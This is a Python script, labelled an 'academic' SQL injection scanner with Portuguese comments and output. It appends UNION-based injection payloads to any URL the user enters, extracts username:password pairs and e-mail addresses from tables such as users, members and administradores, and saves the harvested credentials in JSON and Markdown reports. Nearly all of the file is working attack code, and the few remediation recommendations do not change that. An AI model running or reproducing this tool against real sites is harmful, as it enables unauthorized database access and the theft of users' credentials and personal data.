#!/usr/bin/env python3
import requests
import re
import json
from urllib3.exceptions import InsecureRequestWarning
import warnings
from colorama import Fore, init

init(autoreset=True)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

class SQLiScanner:
    def __init__(self):
        self.REPORT_DIR = "sql_scan_results"
        self.valid_credentials = []
        self.valid_emails = []
        
    def scan(self, url):
        print(f"\n{Fore.CYAN}[+] Testando: {url}")
        
        # Payload para extração direta de credenciais
        payloads = [
            "' UNION SELECT null,concat(username,0x3a,password),null FROM users-- -",
            "' UNION SELECT null,concat(user,0x3a,pass),null FROM members-- -",
            "' UNION SELECT null,concat(login,0x3a,senha),null FROM administradores-- -"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Padrão aprimorado para credenciais
                cred_pattern = r"([a-zA-Z0-9_\-\.]+:[a-zA-Z0-9_\-\.\!\@\#\$\%\^\&\*\(\)]+)"
                found_creds = re.findall(cred_pattern, response.text)
                
                # Padrão para e-mails válidos
                email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}"
                found_emails = re.findall(email_pattern, response.text)
                
                if found_creds:
                    print(f"{Fore.RED}  [!] Credenciais encontradas!")
                    for cred in found_creds:
                        if len(cred.split(':')) == 2:  # Verifica formato user:pass
                            self.valid_credentials.append(cred)
                            print(f"{Fore.YELLOW}    → {cred}")
                
                if found_emails:
                    print(f"{Fore.BLUE}  [*] E-mails encontrados:")
                    for email in found_emails:
                        if not any(x in email for x in ['woff', 'css', 'js']):  # Filtra falsos positivos
                            self.valid_emails.append(email)
                            print(f"{Fore.CYAN}    → {email}")
                            
            except Exception as e:
                print(f"{Fore.RED}  [!] Erro ao testar payload: {e}")
                continue

    def generate_report(self):
        """Gera relatório acadêmico formatado"""
        report = {
            "vulnerabilidade": "SQL Injection",
            "tipo": "Union-Based",
            "impacto": "Alto - Acesso a dados sensíveis",
            "credenciais_extraidas": self.valid_credentials,
            "emails_extraidos": self.valid_emails,
            "recomendacoes": [
                "Implementar prepared statements",
                "Validar e sanitizar todos os inputs",
                "Implementar WAF (Web Application Firewall)",
                "Auditar todas as consultas SQL"
            ]
        }
        
        # Salva em JSON
        with open(f"{self.REPORT_DIR}/report.json", "w") as f:
            json.dump(report, f, indent=2)
            
        # Gera relatório em Markdown para apresentação
        with open(f"{self.REPORT_DIR}/presentation.md", "w") as f:
            f.write("# Relatório de Vulnerabilidade SQL Injection\n\n")
            f.write("## Detalhes da Vulnerabilidade\n")
            f.write(f"- **Tipo**: {report['tipo']}\n")
            f.write(f"- **Nível de impacto**: {report['impacto']}\n\n")
            
            f.write("## Dados Extraídos\n")
            f.write("### Credenciais:\n")
            for cred in report['credenciais_extraidas']:
                f.write(f"- `{cred}`\n")
                
            f.write("\n### E-mails válidos:\n")
            for email in report['emails_extraidos']:
                f.write(f"- `{email}`\n")
                
            f.write("\n## Recomendações de Correção\n")
            for rec in report['recomendacoes']:
                f.write(f"- {rec}\n")

if __name__ == "__main__":
    import os
    os.makedirs("sql_scan_results", exist_ok=True)
    
    scanner = SQLiScanner()
    
    print(f"{Fore.RED}\nSQL Injection Scanner Acadêmico")
    print(f"{Fore.YELLOW}===============================\n")
    
    url = input(f"{Fore.WHITE}[*] Digite a URL vulnerável (ex: http://site.com/page.php?id=1): ")
    scanner.scan(url)
    scanner.generate_report()
    
    print(f"\n{Fore.GREEN}[+] Relatório gerado em:")
    print(f"{Fore.CYAN}  - sql_scan_results/report.json")
    print(f"  - sql_scan_results/presentation.md")